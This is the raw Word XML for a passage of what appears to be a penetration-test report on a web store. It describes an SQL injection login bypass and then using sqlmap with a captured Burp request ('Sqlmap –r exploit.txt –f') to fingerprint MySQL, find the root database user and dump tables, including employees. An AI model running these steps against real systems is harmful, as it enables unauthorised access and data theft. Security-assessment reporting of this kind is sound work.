        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>24</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Customer database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC661C" w14:textId="38A446C0" w:rsidR="00056157" w:rsidRDefault="00056157" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="113B0E0B" w14:textId="7EC9D7EB" w:rsidR="00771827" w:rsidRDefault="00771827" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">The results </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>of this can be seen in figure 25</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">, and show the user logged in as </w:t>
      </w:r>
      <w:hyperlink r:id="rId77" w:history="1">
        <w:r w:rsidRPr="004970E0">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>tjones@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B918CEC" w14:textId="5E832D92" w:rsidR="00771827" w:rsidRDefault="00771827" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6978269C" w14:textId="1300A033" w:rsidR="00771827" w:rsidRDefault="00771827" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10EA8839" wp14:editId="5F08DF12">
            <wp:extent cx="5943600" cy="1723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723390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4976B2E3" w14:textId="6FAA1706" w:rsidR="007520A7" w:rsidRDefault="00771827" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4BA834CE" wp14:editId="205225D7">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4239895</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5753100" cy="635"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="21600"/>
                    <wp:lineTo x="21600" y="21600"/>
                    <wp:lineTo x="21600" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapTight>
                <wp:docPr id="31" name="Text Box 3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E13765B" w14:textId="305EF35F" w:rsidR="00EA689B" w:rsidRPr="00C8423D" w:rsidRDefault="00EA689B" w:rsidP="00771827">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:noProof/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>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t xml:space="preserve"> - SQL Injection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A834CE" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Text Box 31" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:333.85pt;width:453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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="2E13765B" w14:textId="305EF35F" w:rsidR="00EA689B" w:rsidRPr="00C8423D" w:rsidRDefault="00EA689B" w:rsidP="00771827">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:noProof/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>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t xml:space="preserve"> - SQL Injection</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="tight"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251656192" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="44A310FF" wp14:editId="0A8260C8">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>635</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5753100" cy="4182739"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21548"/>
                <wp:lineTo x="21528" y="21548"/>
                <wp:lineTo x="2152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4519" t="11681" r="12660" b="7123"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5753100" cy="41827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B05727">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Sqlm</w:t>
      </w:r>
      <w:r w:rsidR="00C662B0">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>ap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C662B0">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> was</w:t>
      </w:r>
      <w:r w:rsidR="00B05727">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> then used to gain further information about the system. The header for the login page was captured using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B05727">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>burp, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B05727">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> was pasted into a text file called “exploit.txt”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FE2074" w14:textId="38E906BC" w:rsidR="00B05727" w:rsidRDefault="00B05727" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>The type of database in use was found using the command</w:t>
      </w:r>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> –r exploit.txt –f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CBC5CD" w14:textId="7D7C9C49" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30849AA0" w14:textId="2F59B886" w:rsidR="0005519C" w:rsidRDefault="00B14C2C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> returned that the type of</w:t>
      </w:r>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> database in use is MySQL. Knowing this information</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, a lot of other information can be</w:t>
      </w:r>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> found about the database. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DD2E8C" w14:textId="4002CDD6" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>It was found that the user</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> currently</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> logged into the database is ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>root@localhost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">’ which is </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">also </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>the database admin account, and</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> the database</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> used by the application is called</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>called</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>somstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB779DC" w14:textId="5EDF6281" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AD2DC56" w14:textId="055E772B" w:rsidR="0005519C" w:rsidRDefault="00B14C2C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Figure 26</w:t>
      </w:r>
      <w:r w:rsidR="0005519C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows all of the database users on the account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65657BA0" w14:textId="560AEF58" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="780CB675" w14:textId="77777777" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="0005519C">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="032C35B2" wp14:editId="46C79832">
            <wp:extent cx="3267075" cy="1057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67075" cy="1057275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8CEA11" w14:textId="10AD1493" w:rsidR="0005519C" w:rsidRDefault="0005519C" w:rsidP="0005519C">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26</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - database users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA94984" w14:textId="67D60707" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:r>
        <w:t xml:space="preserve">All of the columns from each of the tables in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>stor</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> database were dumped</w:t>
      </w:r>
      <w:r w:rsidR="00065B79">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> c</w:t>
      </w:r>
      <w:r w:rsidR="00AA1E24">
        <w:t>an be seen in A</w:t>
      </w:r>
      <w:r>
        <w:t>ppendix F</w:t>
      </w:r>
      <w:r w:rsidR="00065B79">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7C90E6" w14:textId="4F1FB164" w:rsidR="00B14C2C" w:rsidRDefault="00B14C2C" w:rsidP="00A00353">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> was then used to dump the employees table. This can be seen in Figure 27.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250D5BBF" w14:textId="77777777" w:rsidR="00B14C2C" w:rsidRDefault="00B14C2C" w:rsidP="00B14C2C">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7377DB49" wp14:editId="614B7876">
            <wp:extent cx="5943600" cy="1530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530985"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE5298A" w14:textId="795A18B3" w:rsidR="00B14C2C" w:rsidRDefault="00B14C2C" w:rsidP="00B14C2C">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27</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
